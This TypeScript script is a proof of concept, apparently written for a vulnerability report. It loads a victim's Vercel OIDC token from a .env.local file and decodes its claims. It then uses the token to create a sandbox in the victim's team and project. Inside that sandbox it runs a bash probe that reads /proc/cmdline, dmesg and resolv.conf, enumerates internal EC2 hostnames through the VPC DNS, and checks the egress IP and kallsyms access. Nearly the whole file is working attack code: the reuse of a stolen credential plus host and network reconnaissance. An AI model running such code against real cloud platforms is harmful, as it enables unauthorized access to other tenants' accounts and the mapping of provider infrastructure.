import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const fresh = await Sandbox.create({
    name: "victim-poc",
    token: VICTIM, teamId: V.owner_id, projectId: V.project_id,
    template: "ubuntu",
  });
  console.log("fresh sandbox id:", fresh.id);
  // default policy (allow-all)
  const res = await fresh.runCommand("bash", ["-c", `
set +e
echo "===== CLEAN PoC: host identity + topology disclosure (unprivileged, default image, default policy) ====="
echo "--- uid ---"; id
echo "--- 1. /proc/cmdline ---"; cat /proc/cmdline | tr ' ' '\\n' | grep -aiE "cell_id|build_version|hive|instance|realm|ip="
echo "--- 2. dmesg kernel ---"; dmesg 2>/dev/null | head -1
echo "--- 3. resolv.conf ---"; cat /etc/resolv.conf
echo "--- 4. VPC DNS internal hostname enumeration (172.31.0.2) ---"
for h in ip-172-31-0-2.ec2.internal ip-172-31-16-7.ec2.internal ec2.us-east-1.amazonaws.com amazonaws.com; do
  r=$(timeout 3 getent hosts "$h" 2>/dev/null | head -1)
  echo "  $h -> \${r:-NOHIT}"
done
echo "--- 5. egress public IP via DNS ---"
timeout 5 dig +short TXT o-o.myaddr.l.google.com @172.31.0.2 2>/dev/null | head -1
echo "--- 6. kallsyms readable? ---"; head -1 /proc/kallsyms 2>/dev/null
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
  await fresh.stop();
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
